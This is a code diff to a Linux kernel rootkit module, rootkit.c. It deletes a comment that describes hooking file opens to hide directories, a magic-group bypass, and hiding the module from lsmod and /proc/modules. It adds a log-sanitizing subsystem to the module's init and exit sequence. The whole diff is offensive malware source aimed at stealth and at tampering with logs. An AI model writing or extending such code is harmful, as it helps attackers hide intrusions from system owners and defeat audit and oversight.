@@ -1,16 +1,5 @@
 /*
  * rootkit.c: access blocking, module hiding, init/exit
- *
- * blocking_init/exit: install a hook that intercepts file opens and denies
- * access to HIDDEN_DIR_1 and HIDDEN_DIR_2. Traversal paths like
- * ../../../tmp/secret must also be blocked. Processes with MAGIC_GID in
- * their supplementary groups bypass the block entirely.
- *
- * hide_module/show_module: remove and restore this module from the kernel's
- * module list so it does not appear in lsmod or /proc/modules.
- *
- * rootkit_init/exit: initialize all subsystems in order with goto-based
- * error unwinding. Tear down in reverse order on exit.
  */
 
 #include <linux/module.h>
@@ -265,10 +254,17 @@ static int __init rootkit_init(void)
     goto errorpoint5;
   }
 
+  ret = log_sanitize_init();
+  if (ret < 0) {
+    goto errorpoint6;
+  }
+
   pr_info("[rootkit] All modules loaded");
   return 0;
 
   //goto based error unwinding
+errorpoint6:
+  slink_block_exit();
 errorpoint5:
   blocking_exit();
 errorpoint4:
@@ -288,6 +284,7 @@ static void __exit rootkit_exit(void)
   pr_info("[rootkit] cleaning up\n");
 	
   //show_module();
+  log_sanitize_exit();
   slink_block_exit();
   blocking_exit();
   proc_hide_exit();
